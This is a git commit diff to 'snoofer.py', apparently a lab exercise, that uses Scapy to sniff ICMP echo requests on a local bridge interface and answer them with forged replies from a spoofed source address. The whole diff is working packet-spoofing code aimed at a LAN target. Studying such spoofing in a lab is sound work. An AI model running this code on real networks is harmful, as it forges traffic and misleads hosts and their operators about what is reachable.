5cdd43df0bc61d73f3ad916167253ec099d70024
Noa Amichai <noa1254@gmail.com>
2023-06-08 13:02:22 +0300

    .

--- snoofer.py
+++ snoofer.py
@@ -8,41 +8,32 @@ attacker_ip = "10.9.0.1"
 target_ip = "10.9.0.5"
 
 # Define the IP address of the fake machine
-fake_ip = "8.8.8.8"
+fake_ip = "10.9.0.6"
 
 
-# Define the function to sniff and spoof packets
-# def sniff_and_spoof(pkt):
-#     # Check if the packet is an ICMP echo
-#     if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
-#         print("got request")
-#         # Create a new packet with the spoofed source IP address
-#         spoofed_pkt = IP(src=fake_ip, dst=target_ip, ttl=pkt[IP].ttl) / ICMP(type=0, id=pkt[ICMP].id,
-#                                                                              seq=pkt[ICMP].seq) / "fake"
-#         # Send the spoofed packet
-#         send(spoofed_pkt)
-#         print("sent spoof")
-#         # Print a message to indicate that a packet has been spoofed
-#         print("Spoofed packet sent: {} -> {}".format(spoofed_pkt[IP].src, spoofed_pkt[IP].dst))
 def sniff_and_spoof(pkt):
     # Check if the packet is an ICMP echo
     if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
-        print("got request")
+        print("Got request")
         # Create a new packet with the spoofed source IP address
-        spoofed_pkt = IP(src=fake_ip, dst=target_ip, ttl=pkt[IP].ttl, id=pkt[IP].id) / ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) / "fake"
+        spoofed_pkt = IP(src=fake_ip, dst=target_ip, ttl=pkt[IP].ttl, id=pkt[IP].id) / ICMP(type=0, id=pkt[ICMP].id,
+                                                                                            seq=pkt[ICMP].seq) / pkt[Raw].load
         # Add padding to the spoofed packet to make it the same size as the original packet
-        padding_len = len(pkt) - len(spoofed_pkt)
-        if padding_len > 0:
-            spoofed_pkt = spoofed_pkt / Raw(load="X" * padding_len)
+        #padding_len = len(pkt) - len(spoofed_pkt)
+        #if padding_len > 0:
+        #    spoofed_pkt = spoofed_pkt / Raw(load="X" * padding_len)
         # Send the spoofed packet
-        send(spoofed_pkt)
-        print("sent spoof")
+        send(spoofed_pkt, verbose=False)
+        print("Sent spoof")
         # Print a message to indicate that a packet has been spoofed
         print("Spoofed packet sent: {} -> {}".format(spoofed_pkt[IP].src, spoofed_pkt[IP].dst))
+        print("***********************************************************************")
 
 
 if __name__ == "__main__":
+    interfaces = get_if_list()
+    attacker_interface = next((interface for interface in interfaces if interface.startswith('b')), None)
+
     # Start sniffing packets on the LAN
     print("Start Snoofing...")
-    packets = sniff(filter="icmp", prn=sniff_and_spoof, iface="br-5d71b3b00879")
-    # wrpcap(packets, "snoofer_packets")
+    sniff(filter="icmp", prn=sniff_and_spoof, iface=attacker_interface)
